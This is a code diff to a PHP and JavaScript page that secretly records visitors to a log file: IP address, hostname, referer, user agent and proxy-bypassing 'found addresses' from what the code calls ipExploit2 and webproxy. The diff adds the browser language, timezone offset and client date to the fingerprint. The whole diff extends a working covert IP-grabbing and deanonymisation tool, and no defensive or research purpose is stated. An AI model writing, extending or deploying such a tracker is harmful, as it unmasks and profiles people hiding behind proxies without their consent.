@@ -1,4 +1,6 @@
 <?php
+header('Content-Type: text/html; charset=utf-8');
+mb_internal_encoding("UTF-8");
 if (count($_POST) > 0) {
 	$file = fopen("log.txt", "a");
 	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
@@ -6,10 +8,12 @@ if (count($_POST) > 0) {
 	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
 	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
 	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
+	fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
+	fwrite($file, "Timezone and Data (client side):\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . iconv('utf-8', 'windows-1251', $_POST["date"]) . "\n");
 	fwrite($file, "Found addresses:\n");
 	
 	foreach ( $_POST as $ip ) {
-		if ($ip == $_POST['s1'] || $ip == $_POST['ipv6'] || $ip == "none" && count($_POST) > 1) {
+		if ($ip == $_POST['s1'] || $ip == $_POST['date'] || $ip == $_POST['ipv6'] || $ip == "none" && count($_POST) > 1) {
 			continue;
 		}
 
@@ -97,7 +101,7 @@ if (isset($_GET["redirect"]))
 	function post() {
 		$.post("index.php",
 			{
-				s: ips, s1: webproxy, s2: ipExploit2, ipv6: ipv6,
+				s: ips, s1: webproxy, s2: ipExploit2, ipv6: ipv6, timezone : new Date().getTimezoneOffset()/60 * -1, date: new Date(),  
 			},
 		);
 	}
